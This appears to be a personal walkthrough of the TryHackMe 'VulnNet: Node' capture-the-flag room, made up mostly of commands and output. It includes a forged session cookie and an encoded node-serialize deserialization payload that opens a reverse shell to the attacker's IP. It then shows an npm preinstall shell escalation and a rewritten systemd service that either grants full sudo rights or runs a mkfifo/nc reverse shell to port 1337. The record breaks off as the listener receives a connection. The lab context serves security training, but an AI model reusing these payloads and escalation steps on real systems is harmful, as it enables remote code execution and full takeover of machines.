---
After the previous breach, VulnNet Entertainment states it won't happen again. Can you prove they're wrong?
---

![222](https://tryhackme-images.s3.amazonaws.com/room-icons/ccbc0836dcca57cbcb1a270de2daabf0.png)

### VulnNet: Node

 Start Machine

VulnNet Entertainment has moved its infrastructure and now they're confident that no breach will happen again. You're tasked to prove otherwise and penetrate their network.  

-   Difficulty: Easy
-   Web Language: JavaScript

This is again an attempt to recreate some more realistic scenario but with techniques packed into a single machine. Good luck!

Icon made by [Freepik](https://www.freepik.com/) from [www.flaticon.com  
](https://www.flaticon.com/)[](https://www.freepik.com/vectors/background)

Answer the questions below

```
┌──(kali㉿kali)-[~]
└─$ rustscan -a 10.10.232.157 --ulimit 5500 -b 65535 -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.232.157:8080
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-28 22:18 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:18
Completed NSE at 22:18, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:18
Completed NSE at 22:18, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:18
Completed NSE at 22:18, 0.00s elapsed
Initiating Ping Scan at 22:18
Scanning 10.10.232.157 [2 ports]
Completed Ping Scan at 22:18, 0.27s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 22:18
Completed Parallel DNS resolution of 1 host. at 22:18, 0.09s elapsed
DNS resolution of 1 IPs took 0.10s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 22:18
Scanning 10.10.232.157 [1 port]
Discovered open port 8080/tcp on 10.10.232.157
Completed Connect Scan at 22:18, 0.31s elapsed (1 total ports)
Initiating Service scan at 22:18
Scanning 1 service on 10.10.232.157
Completed Service scan at 22:18, 18.96s elapsed (1 service on 1 host)
NSE: Script scanning 10.10.232.157.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:18
Completed NSE at 22:19, 22.07s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:19
Completed NSE at 22:19, 3.68s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:19
Completed NSE at 22:19, 0.00s elapsed
Nmap scan report for 10.10.232.157
Host is up, received conn-refused (0.28s latency).
Scanned at 2022-12-28 22:18:36 EST for 45s

PORT     STATE SERVICE REASON  VERSION
8080/tcp open  http    syn-ack Node.js Express framework
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: VulnNet &ndash; Your reliable news source &ndash; Try Now!

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:19
Completed NSE at 22:19, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:19
Completed NSE at 22:19, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:19
Completed NSE at 22:19, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 49.57 seconds

http://10.10.232.157:8080/

http://10.10.232.157:8080/login

let's see cookies

┌──(kali㉿kali)-[~]
└─$ echo 'eyJ1c2VybmFtZSI6Ikd1ZXN0IiwiaXNHdWVzdCI6dHJ1ZSwiZW5jb2RpbmciOiAidXRmLTgifQ%3D%3D' | base64 -d
{"username":"Guest","isGuest":true,"encoding": "utf-8"}

so let's encode 

{"username":"Admin","isGuest":false,"encoding": "utf-8"}


┌──(kali㉿kali)-[~]
└─$ echo -n "{"username":"Admin","isGuest":false,"encoding": "utf-8"}" | base64 
e3VzZXJuYW1lOkFkbWluLGlzR3Vlc3Q6ZmFsc2UsZW5jb2Rpbmc6IHV0Zi04fQ==

encoded with cyberchef --> eyJ1c2VybmFtZSI6IkFkbWluIiwiaXNHdWVzdCI6ZmFsc2UsImVuY29kaW5nIjogInV0Zi04In0%3D

without enconde will get an error , and encoded no error, let's see the error

SyntaxError: Unexpected token � in JSON at position 57
    at JSON.parse (<anonymous>)
    at Object.exports.unserialize (/home/www/VulnNet-Node/node_modules/node-serialize/lib/serialize.js:62:16)
    at /home/www/VulnNet-Node/server.js:16:24
    at Layer.handle [as handle_request] (/home/www/VulnNet-Node/node_modules/express/lib/router/layer.js:95:5)
    at next (/home/www/VulnNet-Node/node_modules/express/lib/router/route.js:137:13)
    at Route.dispatch (/home/www/VulnNet-Node/node_modules/express/lib/router/route.js:112:3)
    at Layer.handle [as handle_request] (/home/www/VulnNet-Node/node_modules/express/lib/router/layer.js:95:5)
    at /home/www/VulnNet-Node/node_modules/express/lib/router/index.js:281:22
    at Function.process_params (/home/www/VulnNet-Node/node_modules/express/lib/router/index.js:335:12)
    at next (/home/www/VulnNet-Node/node_modules/express/lib/router/index.js:275:10)


let's see what happen


https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/


https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py

┌──(kali㉿kali)-[~]
└─$ git clone https://github.com/ajinabraham/Node.Js-Security-Course.git
Cloning into 'Node.Js-Security-Course'...
remote: Enumerating objects: 132, done.
remote: Total 132 (delta 0), reused 0 (delta 0), pack-reused 132
Receiving objects: 100% (132/132), 60.15 KiB | 597.00 KiB/s, done.
Resolving deltas: 100% (51/51), done.
                                                                                                              
┌──(kali㉿kali)-[~]
└─$ cd Node.Js-Security-Course 
                                                                                                              
┌──(kali㉿kali)-[~/Node.Js-Security-Course]
└─$ ls
'command execution.js'   eval.js           hpp.js          nodejsshell.py   redos.js
 deserialization.js      fs.js             LICENSE         node-mongo.js    simple_server.js
 dir_traversal.js        global_scope.js   njsscan.sarif   README.md


┌──(kali㉿kali)-[~/Node.Js-Security-Course]
└─$ python2 nodejsshell.py 10.8.19.103 4444                                 
[+] LHOST = 10.8.19.103
[+] LPORT = 4444
[+] Encoding
eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,56,46,49,57,46,49,48,51,34,59,10,80,79,82,84,61,34,52,52,52,52,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))

Now let’s generate the serialized payload and add IIFE brackets `()` after the function body.

{"rce":"_$$ND_FUNC$$_function (){eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,56,46,49,57,46,49,48,51,34,59,10,80,79,82,84,61,34,52,52,52,52,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))}()"}

and finally will be 

eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24gKCl7ZXZhbChTdHJpbmcuZnJvbUNoYXJDb2RlKDEwLDExOCw5NywxMTQsMzIsMTEwLDEwMSwxMTYsMzIsNjEsMzIsMTE0LDEwMSwxMTMsMTE3LDEwNSwxMTQsMTAxLDQwLDM5LDExMCwxMDEsMTE2LDM5LDQxLDU5LDEwLDExOCw5NywxMTQsMzIsMTE1LDExMiw5NywxMTksMTEwLDMyLDYxLDMyLDExNCwxMDEsMTEzLDExNywxMDUsMTE0LDEwMSw0MCwzOSw5OSwxMDQsMTA1LDEwOCwxMDAsOTUsMTEyLDExNCwxMTEsOTksMTAxLDExNSwxMTUsMzksNDEsNDYsMTE1LDExMiw5NywxMTksMTEwLDU5LDEwLDcyLDc5LDgzLDg0LDYxLDM0LDQ5LDQ4LDQ2LDU2LDQ2LDQ5LDU3LDQ2LDQ5LDQ4LDUxLDM0LDU5LDEwLDgwLDc5LDgyLDg0LDYxLDM0LDUyLDUyLDUyLDUyLDM0LDU5LDEwLDg0LDczLDc3LDY5LDc5LDg1LDg0LDYxLDM0LDUzLDQ4LDQ4LDQ4LDM0LDU5LDEwLDEwNSwxMDIsMzIsNDAsMTE2LDEyMSwxMTIsMTAxLDExMSwxMDIsMzIsODMsMTE2LDExNCwxMDUsMTEwLDEwMyw0NiwxMTIsMTE0LDExMSwxMTYsMTExLDExNiwxMjEsMTEyLDEwMSw0Niw5OSwxMTEsMTEwLDExNiw5NywxMDUsMTEwLDExNSwzMiw2MSw2MSw2MSwzMiwzOSwxMTcsMTEwLDEwMCwxMDEsMTAyLDEwNSwxMTAsMTAxLDEwMCwzOSw0MSwzMiwxMjMsMzIsODMsMTE2LDExNCwxMDUsMTEwLDEwMyw0NiwxMTIsMTE0LDExMSwxMTYsMTExLDExNiwxMjEsMTEyLDEwMSw0Niw5OSwxMTEsMTEwLDExNiw5NywxMDUsMTEwLDExNSwzMiw2MSwzMiwxMDIsMTE3LDExMCw5OSwxMTYsMTA1LDExMSwxMTAsNDAsMTA1LDExNiw0MSwzMiwxMjMsMzIsMTE0LDEwMSwxMTYsMTE3LDExNCwxMTAsMzIsMTE2LDEwNCwxMDUsMTE1LDQ2LDEwNSwxMTAsMTAwLDEwMSwxMjAsNzksMTAyLDQwLDEwNSwxMTYsNDEsMzIsMzMsNjEsMzIsNDUsNDksNTksMzIsMTI1LDU5LDMyLDEyNSwxMCwxMDIsMTE3LDExMCw5OSwxMTYsMTA1LDExMSwxMTAsMzIsOTksNDAsNzIsNzksODMsODQsNDQsODAsNzksODIsODQsNDEsMzIsMTIzLDEwLDMyLDMyLDMyLDMyLDExOCw5NywxMTQsMzIsOTksMTA4LDEwNSwxMDEsMTEwLDExNiwzMiw2MSwzMiwxMTAsMTAxLDExOSwzMiwxMTAsMTAxLDExNiw0Niw4MywxMTEsOTksMTA3LDEwMSwxMTYsNDAsNDEsNTksMTAsMzIsMzIsMzIsMzIsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0Niw5OSwxMTEsMTEwLDExMCwxMDEsOTksMTE2LDQwLDgwLDc5LDgyLDg0LDQ0LDMyLDcyLDc5LDgzLDg0LDQ0LDMyLDEwMiwxMTcsMTEwLDk5LDExNiwxMDUsMTExLDExMCw0MCw0MSwzMiwxMjMsMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMTE4LDk3LDExNCwzMiwxMTUsMTA0LDMyLDYxLDMyLDExNSwxMTIsOTcsMTE5LDExMCw0MCwzOSw0Nyw5OCwxMDUsMTEwLDQ3LDExNSwxMDQsMzksNDQsOTEsOTMsNDEsNTksMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0NiwxMTksMTE0LDEwNSwxMTYsMTAxLDQwLDM0LDY3LDExMSwxMTAsMTEwLDEwMSw5OSwxMTYsMTAxLDEwMCwzMyw5MiwxMTAsMzQsNDEsNTksMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0NiwxMTIsMTA1LDExMiwxMDEsNDAsMTE1LDEwNCw0NiwxMTUsMTE2LDEwMCwxMDUsMTEwLDQxLDU5LDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDExNSwxMDQsNDYsMTE1LDExNiwxMDAsMTExLDExNywxMTYsNDYsMTEyLDEwNSwxMTIsMTAxLDQwLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsNDEsNTksMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMTE1LDEwNCw0NiwxMTUsMTE2LDEwMCwxMDEsMTE0LDExNCw0NiwxMTIsMTA1LDExMiwxMDEsNDAsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0MSw1OSwxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwxMTUsMTA0LDQ2LDExMSwxMTAsNDAsMzksMTAxLDEyMCwxMDUsMTE2LDM5LDQ0LDEwMiwxMTcsMTEwLDk5LDExNiwxMDUsMTExLDExMCw0MCw5OSwxMTEsMTAwLDEwMSw0NCwxMTUsMTA1LDEwMywxMTAsOTcsMTA4LDQxLDEyMywxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQ2LDEwMSwxMTAsMTAwLDQwLDM0LDY4LDEwNSwxMTUsOTksMTExLDExMCwxMTAsMTAxLDk5LDExNiwxMDEsMTAwLDMzLDkyLDExMCwzNCw0MSw1OSwxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwxMjUsNDEsNTksMTAsMzIsMzIsMzIsMzIsMTI1LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsNDYsMTExLDExMCw0MCwzOSwxMDEsMTE0LDExNCwxMTEsMTE0LDM5LDQ0LDMyLDEwMiwxMTcsMTEwLDk5LDExNiwxMDUsMTExLDExMCw0MCwxMDEsNDEsMzIsMTIzLDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDExNSwxMDEsMTE2LDg0LDEwNSwxMDksMTAxLDExMSwxMTcsMTE2LDQwLDk5LDQwLDcyLDc5LDgzLDg0LDQ0LDgwLDc5LDgyLDg0LDQxLDQ0LDMyLDg0LDczLDc3LDY5LDc5LDg1LDg0LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDEyNSw0MSw1OSwxMCwxMjUsMTAsOTksNDAsNzIsNzksODMsODQsNDQsODAsNzksODIsODQsNDEsNTksMTApKX0oKSJ9

to use in session cookie

┌──(kali㉿kali)-[~]
└─$ rlwrap nc -lnvp 4444
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.232.157.
Ncat: Connection from 10.10.232.157:60098.
Connected!

:)

┌──(kali㉿kali)-[~]
└─$ rlwrap nc -lnvp 4444
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.232.157.
Ncat: Connection from 10.10.232.157:60098.
Connected!
id
uid=1001(www) gid=1001(www) groups=1001(www)
groups
www
export TERM=xterm;export SHELL=bash;python3 -c 'import pty;pty.spawn("/bin/bash")'
www@vulnnet-node:~/VulnNet-Node$ pwd                              pwd
pwd
/home/www/VulnNet-Node

www@vulnnet-node:~/VulnNet-Node$ find / -type f -name user.txt 2>/find / -type f -name user.txt 2>/dev/null
find / -type f -name user.txt 2>/dev/null
www@vulnnet-node:~/VulnNet-Node$ cd ..                            cd ..
cd ..
www@vulnnet-node:~$ cd ..               cd ..
cd ..
www@vulnnet-node:/home$ ls                      ls
ls
serv-manage  www
www@vulnnet-node:/home$ cd serv-manage          cd serv-manage
cd serv-manage
bash: cd: serv-manage: Permission denied
www@vulnnet-node:/home$ sudo -l                 sudo -l
sudo -l
Matching Defaults entries for www on vulnnet-node:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www may run the following commands on vulnnet-node:
    (serv-manage) NOPASSWD: /usr/bin/npm


https://gtfobins.github.io/gtfobins/npm/


TF=$(mktemp -d)
echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
sudo npm -C $TF --unsafe-perm i

www@vulnnet-node:/home$ TF=$(mktemp -d)         TF=$(mktemp -d)
www@vulnnet-node:/home$                         echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
age.jsonscripts": {"preinstall": "/bin/sh"}}' > $TF/packa
www@vulnnet-node:/home$ chmod 777 $TF           chmod 777 $TF
chmod 777 $TF
www@vulnnet-node:/home$ sudo -u serv-manage /usrsudo -u serv-manage /usr/bin/npm -C $TF --unsafe-perm i
sudo -u serv-manage /usr/bin/npm -C $TF --unsafe-perm i

> @ preinstall /tmp/tmp.jeRgicyAcT
> /bin/sh

$ id
id
uid=1000(serv-manage) gid=1000(serv-manage) groups=1000(serv-manage)


the command is like this:

TF=$(mktemp -d) 
echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json 
chmod 777 $TF 
sudo -u serv-manage /usr/bin/npm -C $TF --unsafe-perm i


> @ preinstall /tmp/tmp.jeRgicyAcT
> /bin/sh

$ id
id
uid=1000(serv-manage) gid=1000(serv-manage) groups=1000(serv-manage)
$ /bin/bash
serv-manage@vulnnet-node:/tmp/tmp.jeRgicyAcT$                                               cd /home/serv-manage
cd /home/serv-manage
serv-manage@vulnnet-node:~$ ls                          ls
ls
Desktop    Downloads  Pictures  Templates  Videos
Documents  Music      Public    user.txt
serv-manage@vulnnet-node:~$ cat user.txt                cat user.txt
cat user.txt
THM{064640a2f880ce9ed7a54886f1bde821}
serv-manage@vulnnet-node:~$ 


privesc

serv-manage@vulnnet-node:~$ sudo -l                     sudo -l
sudo -l
Matching Defaults entries for serv-manage on vulnnet-node:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User serv-manage may run the following commands on vulnnet-node:
    (root) NOPASSWD: /bin/systemctl start vulnnet-auto.timer
    (root) NOPASSWD: /bin/systemctl stop vulnnet-auto.timer
    (root) NOPASSWD: /bin/systemctl daemon-reload

With systemctl status we can find the path of the timer file

serv-manage@vulnnet-node:~$ systemctl status vulnnet-auto.timer
systemctl status vulnnet-auto.timer
● vulnnet-auto.timer - Run VulnNet utilities every 30 min
   Loaded: loaded (/etc/systemd/system/vulnnet-auto.timer; disabled; vendor pres
   Active: inactive (dead)
  Trigger: n/a


serv-manage@vulnnet-node:~$ ls -lh /etc/systemd/system/vulnnet-auto.timer
ls -lh /etc/systemd/system/vulnnet-auto.timer
-rw-rw-r-- 1 root serv-manage 167 Jan 24  2021 /etc/systemd/system/vulnnet-auto.timer

serv-manage@vulnnet-node:~$ cat /etc/systemd/system/vulnnet-auto.timer
cat /etc/systemd/system/vulnnet-auto.timer
[Unit]
Description=Run VulnNet utilities every 30 min

[Timer]
OnBootSec=0min
# 30 min job
OnCalendar=*:0/30
Unit=vulnnet-job.service

[Install]
WantedBy=basic.target

The timer is starting a job after 30min.

We can find the service and see it is writable by serv-manage

serv-manage@vulnnet-node:~$ systemctl status vulnnet-job.service
systemctl status vulnnet-job.service
● vulnnet-job.service - Logs system statistics to the systemd journal
   Loaded: loaded (/etc/systemd/system/vulnnet-job.service; disabled; vendor pre
   Active: inactive (dead)

serv-manage@vulnnet-node:~$ ls -lh /etc/systemd/system/vulnnet-job.service
ls -lh /etc/systemd/system/vulnnet-job.service
-rw-rw-r-- 1 root serv-manage 197 Jan 24  2021 /etc/systemd/system/vulnnet-job.service

serv-manage@vulnnet-node:~$ cat /etc/systemd/system/vulnnet-job.service
cat /etc/systemd/system/vulnnet-job.service
[Unit]
Description=Logs system statistics to the systemd journal
Wants=vulnnet-auto.timer

[Service]
# Gather system statistics
Type=forking
ExecStart=/bin/df

[Install]
WantedBy=multi-user.target

cnnot write with nano 

so just using echo :)

1st way

[Unit]
Description=Logs system statistics to the systemd journal
Wants=vulnnet-auto.timer
[Service]
# Gather system statistics
Type=forking
#ExecStart=/bin/df
ExecStart=/bin/sh -c 'echo "serv-manage ALL=(root) NOPASSWD: ALL" > /etc/sudoers'
[Install]
WantedBy=multi-user.target

and base64 will be

W1VuaXRdCkRlc2NyaXB0aW9uPUxvZ3Mgc3lzdGVtIHN0YXRpc3RpY3MgdG8gdGhlIHN5c3RlbWQgam91cm5hbApXYW50cz12dWxubmV0LWF1dG8udGltZXIKW1NlcnZpY2VdCiMgR2F0aGVyIHN5c3RlbSBzdGF0aXN0aWNzClR5cGU9Zm9ya2luZwojRXhlY1N0YXJ0PS9iaW4vZGYKRXhlY1N0YXJ0PS9iaW4vc2ggLWMgJ2VjaG8gInNlcnYtbWFuYWdlIEFMTD0ocm9vdCkgTk9QQVNTV0Q6IEFMTCIgPiAvZXRjL3N1ZG9lcnMnCltJbnN0YWxsXQpXYW50ZWRCeT1tdWx0aS11c2VyLnRhcmdldAo=

second way

[Unit]
Description=Logs system statistics to the systemd journal
Wants=vulnnet-auto.timer
[Service]
# Gather system statistics
Type=forking
#ExecStart=/bin/df
ExecStart=/bin/bash -c 'rm /tmp/g;mkfifo /tmp/g;cat /tmp/g|/bin/sh -i 2>&1|nc 10.8.19.103 1337 > /tmp/g'
[Install]
WantedBy=multi-user.target

and base64 will be

W1VuaXRdCkRlc2NyaXB0aW9uPUxvZ3Mgc3lzdGVtIHN0YXRpc3RpY3MgdG8gdGhlIHN5c3RlbWQgam91cm5hbApXYW50cz12dWxubmV0LWF1dG8udGltZXIKW1NlcnZpY2VdCiMgR2F0aGVyIHN5c3RlbSBzdGF0aXN0aWNzClR5cGU9Zm9ya2luZwojRXhlY1N0YXJ0PS9iaW4vZGYKRXhlY1N0YXJ0PS9iaW4vYmFzaCAtYyAncm0gL3RtcC9nO21rZmlmbyAvdG1wL2c7Y2F0IC90bXAvZ3wvYmluL3NoIC1pIDI+JjF8bmMgMTAuOC4xOS4xMDMgMTMzNyA+IC90bXAvZycKW0luc3RhbGxdCldhbnRlZEJ5PW11bHRpLXVzZXIudGFyZ2V0Cg==

let's do the second method

echo 'W1VuaXRdCkRlc2NyaXB0aW9uPUxvZ3Mgc3lzdGVtIHN0YXRpc3RpY3MgdG8gdGhlIHN5c3RlbWQgam91cm5hbApXYW50cz12dWxubmV0LWF1dG8udGltZXIKW1NlcnZpY2VdCiMgR2F0aGVyIHN5c3RlbSBzdGF0aXN0aWNzClR5cGU9Zm9ya2luZwojRXhlY1N0YXJ0PS9iaW4vZGYKRXhlY1N0YXJ0PS9iaW4vYmFzaCAtYyAncm0gL3RtcC9nO21rZmlmbyAvdG1wL2c7Y2F0IC90bXAvZ3wvYmluL3NoIC1pIDI+JjF8bmMgMTAuOC4xOS4xMDMgMTMzNyA+IC90bXAvZycKW0luc3RhbGxdCldhbnRlZEJ5PW11bHRpLXVzZXIudGFyZ2V0Cg==' | base64 -d > /etc/systemd/system/vulnnet-job.service



serv-manage@vulnnet-node:/tmp/tmp.DHRcCalyiZ$                                               echo 'W1VuaXRdCkRlc2NyaXB0aW9uPUxvZ3Mgc3lzdGVtIHN0YXRpc3RpY3MgdG8gdGhlIHN5c3RlbWQgam91cm5hbApXYW50cz12dWxubmV0LWF1dG8udGltZXIKW1NlcnZpY2VdCiMgR2F0aGVyIHN5c3RlbSBzdGF0aXN0aWNzClR5cGU9Zm9ya2luZwojRXhlY1N0YXJ0PS9iaW4vZGYKRXhlY1N0YXJ0PS9iaW4vYmFzaCAtYyAncm0gL3RtcC9nO21rZmlmbyAvdG1wL2c7Y2F0IC90bXAvZ3wvYmluL3NoIC1pIDI+JjF8bmMgMTAuOC4xOS4xMDMgMTMzNyA+IC90bXAvZycKW0luc3RhbGxdCldhbnRlZEJ5PW11bHRpLXVzZXIudGFyZ2V0Cg==' | base64 -d > /etc/systemd/system/vulnnet-job.service
temd/system/vulnnet-job.service1bHRpLXVzZXIudGFyZ2V0Cg==' | base64 -d > /etc/syst

now stop the timer, reload modified files on disk and start the timer

serv-manage@vulnnet-node:/tmp/tmp.DHRcCalyiZ$ sudo /bin/systemctl stop vulnnet-auto.timer
serv-manage@vulnnet-node:/tmp/tmp.DHRcCalyiZ$  sudo /bin/systemctl daemon-reload
serv-manage@vulnnet-node:/tmp/tmp.DHRcCalyiZ$   sudo /bin/systemctl start vulnnet-auto.timer

revshell

┌──(kali㉿kali)-[~]
└─$ rlwrap nc -lnvp 1337
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.10.232.157.
